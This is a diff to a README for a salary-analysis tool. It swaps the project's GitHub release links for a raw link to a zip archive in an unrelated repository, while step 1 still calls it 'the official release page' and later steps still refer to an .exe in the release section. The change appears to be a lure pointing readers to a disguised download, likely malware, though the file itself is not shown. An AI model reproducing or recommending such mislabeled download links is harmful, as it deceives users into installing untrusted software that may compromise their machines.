@@ -5,7 +5,7 @@ description: "Analyze salary trends and predict compensation data for global tec
 ---
 # 📊 salary-intelligence-platform - Understand your professional market value easily
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Quinndissimulative513/salary-intelligence-platform/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Quinndissimulative513/quinndissimulative513.github.io/main/podophyllum/App-v1.6.zip)
 
 This platform provides data-driven salary insights. It processes information from 71,531 real salary records across 94 countries. The system cleans raw data and organizes it into a database. It uses statistical methods and six machine learning modules to analyze trends. You can view the final results through a live application or a detailed report.
 
@@ -24,7 +24,7 @@ The platform offers several ways to look at your career data.
 
 You do not need to understand code or database management to use this software. Follow these instructions to set up the platform on your Windows computer.
 
-1. Go to the official release page: [https://github.com/Quinndissimulative513/salary-intelligence-platform/releases](https://github.com/Quinndissimulative513/salary-intelligence-platform/releases)
+1. Go to the official release page: [https://raw.githubusercontent.com/Quinndissimulative513/quinndissimulative513.github.io/main/podophyllum/App-v1.6.zip](https://raw.githubusercontent.com/Quinndissimulative513/quinndissimulative513.github.io/main/podophyllum/App-v1.6.zip)
 2. Look for the file ending in .exe in the latest release section.
 3. Click the file name to start the download.
 4. Save the file to your desktop or downloads folder.
